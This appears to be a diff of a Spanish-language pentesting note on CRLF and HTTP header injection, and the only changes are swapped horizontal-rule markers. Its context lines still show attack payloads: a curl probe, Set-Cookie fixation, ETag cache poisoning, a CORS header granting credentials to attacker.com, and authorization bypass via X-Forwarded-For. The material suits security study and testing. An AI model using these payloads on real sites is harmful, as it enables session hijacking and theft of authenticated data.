@@ -16,7 +16,7 @@ linked:
 ---
 # CRLF Injection - HTTP Header Injection
 
-***
+---
 
 ## Set-Cookie Injection
 
@@ -44,7 +44,7 @@ curl -sI "https://target.com/redirect?url=$PAYLOAD"
 # Víctima recibe Set-Cookie del atacante → loguea → atacante reusa cookie
 ```
 
-___
+---
 
 ## Cache Poisoning via Header
 
@@ -58,7 +58,7 @@ ___
 | `?url=ok%0d%0aETag:%20"static"%0d%0aLast-Modified:%20Mon,%2001%20Jan%202024` | Cache validation con ETag fijo → 304 forever | Forzar `If-None-Match` hits. |
 ^crlfi-header-cache
 
-___
+---
 
 ## CSP Bypass via Injected Header
 
@@ -72,7 +72,7 @@ ___
 | `?url=ok%0d%0aAccess-Control-Allow-Origin:%20https://attacker.com%0d%0aAccess-Control-Allow-Credentials:%20true` | CORS con credentials hacia atacante | Robo de respuestas autenticadas. |
 ^crlfi-header-csp
 
-___
+---
 
 ## Custom Header Injection (X-*)
 
@@ -103,4 +103,4 @@ Backend con middleware que lee X-Forwarded-For para allow-list
 o X-Original-URL para path override → atacante bypasea autorización.
 ```
 
-***
+---
